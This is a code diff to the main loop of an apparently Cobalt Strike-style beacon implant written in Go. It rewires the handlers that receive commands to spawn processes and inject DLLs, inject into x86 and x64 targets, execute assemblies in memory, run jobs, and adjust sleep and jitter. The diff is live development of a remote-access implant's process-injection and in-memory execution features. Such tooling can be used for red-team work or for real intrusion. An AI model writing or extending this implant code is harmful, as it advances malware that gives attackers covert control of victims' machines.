@@ -2,9 +2,9 @@ package main
 
 import (
 	"bytes"
+	"encoding/binary"
 	"fmt"
 	"main/command"
-	"main/config"
 	"main/packet"
 	"main/sysinfo"
 	"main/util"
@@ -36,7 +36,7 @@ func main() {
 					//fmt.Printf("timestamp: %v\n", timestamp)
 					// 4 bytes data length
 					lenBytes := decrypted[4:8]
-					packetLen := packet.ReadInt(lenBytes)
+					packetLen := binary.BigEndian.Uint32(lenBytes)
 
 					decryptedBuf := bytes.NewBuffer(decrypted[8:])
 					for {
@@ -76,26 +76,25 @@ func main() {
 								execErr = command.MakeToken(cmdBuf)
 							// TODO have no idea about how to deal with token
 							case command.CMD_TYPE_SPAWN_TOKEN_X64:
-								fallthrough
+								execErr = command.SpawnAndInjectDll(cmdBuf, true, false)
 							case command.CMD_TYPE_SPAWN_IGNORE_TOKEN_X64:
-								execErr = command.SpawnAndInjectDllX64(cmdBuf)
+								execErr = command.SpawnAndInjectDll(cmdBuf, true, true)
 							case command.CMD_TYPE_SPAWN_TOKEN_X86:
-								fallthrough
+								execErr = command.SpawnAndInjectDll(cmdBuf, false, false)
 							case command.CMD_TYPE_SPAWN_IGNORE_TOKEN_X86:
-								execErr = command.SpawnAndInjectDllX86(cmdBuf)
+								execErr = command.SpawnAndInjectDll(cmdBuf, false, true)
 							case command.CMD_TYPE_INJECT_X86:
-								fallthrough
+								execErr = command.InjectDll(cmdBuf, false)
 							case command.CMD_TYPE_INJECT_X64:
-								execErr = command.InjectDll(cmdBuf)
+								execErr = command.InjectDll(cmdBuf, true)
 							case command.CMD_TYPE_EXEC_ASM_TOKEN_X86:
-								fallthrough
+								execErr = command.ExecAsm(cmdBuf, false, false)
 							case command.CMD_TYPE_EXEC_ASM_IGNORE_TOKEN_X86:
-								fallthrough
+								execErr = command.ExecAsm(cmdBuf, false, true)
 							case command.CMD_TYPE_EXEC_ASM_TOKEN_X64:
-								fallthrough
+								execErr = command.ExecAsm(cmdBuf, true, false)
 							case command.CMD_TYPE_EXEC_ASM_IGNORE_TOKEN_X64:
-								// TODO exec asm in memory
-								execErr = command.ExecAsm(cmdBuf)
+								execErr = command.ExecAsm(cmdBuf, true, true)
 							case command.CMD_TYPE_JOB:
 								execErr = command.HandlerJobAsync(cmdBuf)
 							case command.CMD_TYPE_LIST_JOBS:
@@ -135,11 +134,7 @@ func main() {
 							case command.CMD_TYPE_MAKEDIR:
 								execErr = command.MakeDir(string(cmdBuf))
 							case command.CMD_TYPE_SLEEP:
-								sleep := packet.ReadInt(cmdBuf[:4])
-								jitter := packet.ReadInt(cmdBuf[4:8])
-								fmt.Printf("Now sleep is %d ms, jitter is %d%%\n", sleep, jitter)
-								config.WaitTime = int(sleep)
-								config.Jitter = int(jitter)
+								command.ChangeSleep(cmdBuf)
 							case command.CMD_TYPE_PWD:
 								execErr = command.GetCurrentDirectory()
 							case command.CMD_TYPE_LIST_NETWORK:
